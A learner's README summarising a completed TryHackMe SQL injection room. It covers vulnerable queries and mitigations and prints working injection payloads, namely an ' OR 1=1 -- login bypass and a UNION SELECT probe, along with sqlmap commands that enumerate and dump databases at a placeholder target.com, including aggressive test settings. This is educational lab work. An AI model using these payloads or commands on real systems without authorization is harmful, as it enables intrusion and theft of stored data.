# 💉 DAY 43 SQL Injection Fundamentals — TryHackMe (Final Version)

## 📌 Overview

This repository documents the completion of the **"SQL Injection Fundamentals"** room on TryHackMe.

This room focuses on understanding how SQL Injection (SQLi) vulnerabilities occur, how attackers exploit them, and how improper input validation can lead to database compromise.

All tasks have been successfully completed.

---

## 🎯 Learning Objectives Achieved

✔ Understand what SQL Injection is
✔ Learn how vulnerable queries are constructed
✔ Exploit basic authentication bypass
✔ Perform UNION-based SQL Injection
✔ Extract data from databases
✔ Understand defensive mitigation concepts

---

## 🧠 What is SQL Injection?

SQL Injection is a web vulnerability that allows an attacker to manipulate SQL queries executed by a database.

It occurs when user input is directly included in a SQL query without proper validation or parameterization.

Example of vulnerable query:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

If input is not sanitized, an attacker can modify the logic of the query.

---

## 🔓 Authentication Bypass Example

Input:

```
' OR 1=1 --
```

Injected query becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '';
```

Since `1=1` is always true, authentication can be bypassed.

---

## 🧩 UNION-Based SQL Injection

Used to extract data from other tables.

Example:

```sql
' UNION SELECT null, database() --
```

Used for:

* Database enumeration
* Table discovery
* Column identification
* Data extraction

---

## 🔎 Enumeration Techniques Learned

✔ Determining number of columns
✔ Identifying injectable parameters
✔ Extracting database names
✔ Extracting table names
✔ Dumping sensitive data

---

## 🛡️ Mitigation Concepts

To prevent SQL Injection:

* Use prepared statements
* Parameterized queries
* Input validation
* Least privilege database accounts
* Web Application Firewalls (WAF)

---

## 🔐 Security Relevance (Offensive Perspective)

SQL Injection is one of the most critical web vulnerabilities and frequently appears in:

* Bug bounty programs
* CTF challenges
* Real-world web applications

Understanding SQLi is fundamental for:

* Web penetration testing
* Red Team engagements
* Secure coding awareness

---

## 🏁 Room Completion Status

* ✅ All tasks completed
* 🧠 Practical SQL Injection exploitation performed

---

## 🤖 SQLMap Usage (Automation)

During this room and further practice, automated exploitation using **SQLMap** was introduced as a powerful way to test and exploit SQL Injection vulnerabilities.

### Basic Detection

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

### Enumerating Databases

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

---

### Enumerating Tables

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
```

---

### Enumerating Columns

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
```

---

### Dumping Data

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump
```

---

### Increasing Test Intensity

```bash
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

* `--level=5` → Tests more parameters and deeper injection points
* `--risk=3` → Enables more aggressive payloads

---

### Using the Wizard Mode

```bash
sqlmap --wizard
```

Wizard mode guides the user interactively through:

* Target selection
* Injection type
* Enumeration steps

---

### Working with POST Requests

```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --dbs
```

---

### Using a Burp Request File

```bash
sqlmap -r request.txt --dbs
```

This allows seamless integration with **Burp Suite**.

---

## ⚠️ Important Ethical Note

SQLMap must only be used:

* In lab environments
* On systems you own
* With explicit authorization

Unauthorized usage is illegal.

---

